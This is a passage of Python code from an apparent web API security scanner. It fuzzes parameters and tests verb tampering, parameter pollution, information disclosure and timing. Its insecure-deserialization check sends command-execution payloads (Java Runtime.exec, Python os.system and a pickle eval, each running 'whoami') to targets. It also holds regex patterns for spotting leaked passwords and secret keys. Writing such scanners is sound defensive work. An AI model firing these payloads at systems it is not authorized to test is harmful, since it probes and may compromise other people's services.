                                if fuzz_resp.status_code >= 500 or "error" in fuzz_resp.text.lower():
                                    validation_results[f"URL_PARAM: {payload}"] = "Potential input validation issue"
                            except Exception as e:
                                print(f"⚠️  Warning: Input validation test failed for payload {payload}: {e}")
                                continue
                    
                    # Test POST body parameters (for POST/PUT/PATCH requests)
                    if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                        try:
                            # Parse existing JSON data
                            if isinstance(data, str):
                                json_data = json.loads(data)
                            else:
                                json_data = data
                            
                            # Test each field in the JSON body
                            for field_name in json_data.keys():
                                original_value = json_data[field_name]
                                for payload in test_payloads:
                                    try:
                                        # Create new data with validation test payload
                                        test_data = json_data.copy()
                                        test_data[field_name] = payload
                                        
                                        fuzz_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                        if fuzz_resp.status_code >= 500 or "error" in fuzz_resp.text.lower():
                                            validation_results[f"BODY_{field_name}: {payload}"] = "Potential input validation issue"
                                    except Exception as e:
                                        print(f"⚠️  Warning: Input validation test failed for payload {payload}: {e}")
                                        continue
                        except (json.JSONDecodeError, TypeError):
                            # If not JSON, test as form data
                            for payload in test_payloads:
                                try:
                                    if isinstance(data, str):
                                        # Try to append to form data
                                        test_data = data + f"&input={quote(payload)}"
                                    else:
                                        test_data = data
                                    fuzz_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                                    if fuzz_resp.status_code >= 500 or "error" in fuzz_resp.text.lower():
                                        validation_results[f"FORM_DATA: {payload}"] = "Potential input validation issue"
                                except Exception as e:
                                    print(f"⚠️  Warning: Input validation test failed for payload {payload}: {e}")
                                    continue
                    
                    findings["input_validation"][url] = validation_results
                except Exception as e:
                    print(f"⚠️  Warning: Input validation test failed: {e}")
                    findings["input_validation"][url] = {}
                progress.finish_check("Testing Input Validation")

            # 19. Sensitive data exposure
            if 'sensitive_data' in checks_to_run:
                progress.start_check("Testing Sensitive Data Exposure")
                sensitive_data = []
                for pattern in PII_PATTERNS:
                    matches = re.findall(pattern, resp.text, re.IGNORECASE)
                    if matches:
                        sensitive_data.extend(matches[:3])
                findings["sensitive_data"][url] = sensitive_data
                progress.finish_check("Testing Sensitive Data Exposure")

            # 20. HTTP Verb Tampering
            if 'http_verb_tampering' in checks_to_run:
                progress.start_check("Testing HTTP Verb Tampering")
                verb_results = {}
                for verb in HTTP_VERBS:
                    try:
                        verb_resp = requests.request(verb, url, headers=headers, data=data, timeout=5)
                        verb_results[verb] = {
                            "status_code": verb_resp.status_code,
                            "allowed": verb_resp.status_code not in [405, 501]
                        }
                    except:
                        verb_results[verb] = {"status_code": "error", "allowed": False}
                findings["http_verb_tampering"][url] = verb_results
                progress.finish_check("Testing HTTP Verb Tampering")

            # 21. Insecure Deserialization
            if 'insecure_deserialization' in checks_to_run:
                progress.start_check("Testing Insecure Deserialization")
                deserialization_findings = {}
                
                # Test various serialization formats
                test_payloads = [
                    '{"rce": "java.lang.Runtime.getRuntime().exec(\"whoami\")"}',
                    '{"type": "java.lang.Runtime", "method": "exec", "args": ["whoami"]}',
                    '{"@type": "java.lang.Runtime", "method": "exec", "args": ["whoami"]}',
                    '{"rce": "python.eval(\"__import__(\'os\').system(\'whoami\')")"}',
                    '{"pickle": "c__builtin__\neval\np0\n(S\'__import__(\\\'os\\\').system(\\\'whoami\\\')\')\np1\ntp2\nRp3\n."}'
                ]
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in test_payloads:
                        deserialization_url = url + f"?data={quote(payload)}"
                        deserialization_resp = req_func(deserialization_url, headers=headers, data=data, timeout=5)
                        if any(indicator in deserialization_resp.text.lower() for indicator in ['runtime', 'exec', 'eval', 'system', 'whoami']):
                            deserialization_findings[f"URL_PARAM: {payload}"] = "Potential insecure deserialization"
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test each field in the JSON body
                        for field_name in json_data.keys():
                            original_value = json_data[field_name]
                            for payload in test_payloads:
                                # Create new data with deserialization payload
                                test_data = json_data.copy()
                                test_data[field_name] = payload
                                
                                deserialization_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                                if any(indicator in deserialization_resp.text.lower() for indicator in ['runtime', 'exec', 'eval', 'system', 'whoami']):
                                    deserialization_findings[f"BODY_{field_name}: {payload}"] = "Potential insecure deserialization"
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        for payload in test_payloads:
                            if isinstance(data, str):
                                # Try to append to form data
                                test_data = data + f"&data={quote(payload)}"
                            else:
                                test_data = data
                            deserialization_resp = req_func(url, headers=headers, data=test_data, timeout=5)
                            if any(indicator in deserialization_resp.text.lower() for indicator in ['runtime', 'exec', 'eval', 'system', 'whoami']):
                                deserialization_findings[f"FORM_DATA: {payload}"] = "Potential insecure deserialization"
                
                if deserialization_findings:
                    findings["insecure_deserialization"][url] = deserialization_findings
                progress.finish_check("Testing Insecure Deserialization")

            # 22. Parameter Pollution
            if 'parameter_pollution' in checks_to_run:
                progress.start_check("Testing Parameter Pollution")
                pollution_findings = {}
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    # Test duplicate parameters
                    pollution_url = url + "?id=1&id=2&id=3"
                    pollution_resp = req_func(pollution_url, headers=headers, data=data, timeout=5)
                    pollution_findings['duplicate_url_params'] = pollution_resp.status_code == 200
                    
                    # Test array parameters
                    array_url = url + "?id[]=1&id[]=2&id[]=3"
                    array_resp = req_func(array_url, headers=headers, data=data, timeout=5)
                    pollution_findings['array_url_params'] = array_resp.status_code == 200
                
                # Test POST body parameters (for POST/PUT/PATCH requests)
                if method.upper() in ['POST', 'PUT', 'PATCH'] and data:
                    try:
                        # Parse existing JSON data
                        if isinstance(data, str):
                            json_data = json.loads(data)
                        else:
                            json_data = data
                        
                        # Test duplicate fields in JSON
                        test_data = json_data.copy()
                        test_data['id'] = [1, 2, 3]  # Array value
                        pollution_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                        pollution_findings['duplicate_body_fields'] = pollution_resp.status_code == 200
                        
                        # Test nested objects
                        test_data = json_data.copy()
                        test_data['nested'] = {"id": [1, 2, 3]}
                        nested_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=5)
                        pollution_findings['nested_body_objects'] = nested_resp.status_code == 200
                        
                    except (json.JSONDecodeError, TypeError):
                        # If not JSON, test as form data
                        pollution_data = data + "&id=1&id=2&id=3" if isinstance(data, str) else data
                        pollution_resp = req_func(url, headers=headers, data=pollution_data, timeout=5)
                        pollution_findings['duplicate_form_fields'] = pollution_resp.status_code == 200
                
                if pollution_findings:
                    findings["parameter_pollution"][url] = pollution_findings
                progress.finish_check("Testing Parameter Pollution")

            # 23. Information Disclosure
            if 'information_disclosure' in checks_to_run:
                progress.start_check("Testing Information Disclosure")
                disclosure_findings = []
                
                # Check for sensitive information in responses
                sensitive_patterns = [
                    r'error.*stack.*trace',
                    r'debug.*mode',
                    r'development.*environment',
                    r'version.*\d+\.\d+\.\d+',
                    r'build.*\d+',
                    r'commit.*[a-f0-9]{7,}',
                    r'file.*path.*error',
                    r'database.*connection',
                    r'config.*password',
                    r'secret.*key'
                ]
                
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, resp.text, re.IGNORECASE)
                    if matches:
                        disclosure_findings.extend(matches[:3])  # Limit to 3 matches
                
                if disclosure_findings:
                    findings["information_disclosure"][url] = disclosure_findings
                progress.finish_check("Testing Information Disclosure")

            # 24. Timing Attacks
            if 'timing_attacks' in checks_to_run:
                progress.start_check("Testing Timing Attacks")
                timing_findings = {}
                
                # Test timing differences for different inputs
                timing_payloads = [
                    "admin",  # Valid username
                    "invalid_user_12345",  # Invalid username
                    "a" * 1000,  # Long input
                    "",  # Empty input
                ]
                
                for payload in timing_payloads:
                    start_time = time.time()
                    
                    if method.upper() == 'GET' or '?' in url:
                        timing_url = url + f"?username={quote(payload)}"
                        timing_resp = req_func(timing_url, headers=headers, data=data, timeout=10)
                    else:
                        # Test in POST body
                        try:
                            if isinstance(data, str):
                                json_data = json.loads(data)
                            else:
                                json_data = data
                            
                            test_data = json_data.copy()
                            test_data['username'] = payload
                            timing_resp = req_func(url, headers=headers, data=json.dumps(test_data), timeout=10)
                        except:
                            timing_resp = req_func(url, headers=headers, data=data, timeout=10)
                    
                    response_time = time.time() - start_time
                    timing_findings[payload] = {
                        "response_time": response_time,
                        "status_code": timing_resp.status_code
                    }
                
                findings["timing_attacks"][url] = timing_findings
                progress.finish_check("Testing Timing Attacks")

        except Exception as e:
            findings.setdefault("errors", []).append({"endpoint": url, "error": str(e)})

    # Get final summary
    summary = progress.get_summary()
    print(f"\n✅ Security scan completed! Ran {summary['completed']}/{summary['total']} checks at '{severity}' severity level in {summary['elapsed_time']}")
    return findings 